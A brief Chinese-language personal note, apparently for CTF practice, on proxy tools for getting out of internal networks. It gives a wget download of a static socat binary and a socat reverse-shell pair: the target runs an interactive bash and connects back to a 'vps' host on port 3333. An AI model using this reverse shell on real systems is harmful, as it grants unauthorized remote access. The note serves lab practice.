# 记录一些代理工具

>目前是用与ctf的内网环境代理出内网。

### socat
地址：http://www.iteait.com/archives/603

socat下载:地址
https://raw.githubusercontent.com/andrew-d/static-binaries/master/binaries/linux/x86_64/socat

直接wget https://raw.githubusercontent.com/andrew-d/static-binaries/master/binaries/linux/x86_64/socat

靶机：socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:vps:3333
主机：socat file:`tty`,raw,echo=0 tcp-listen:3333










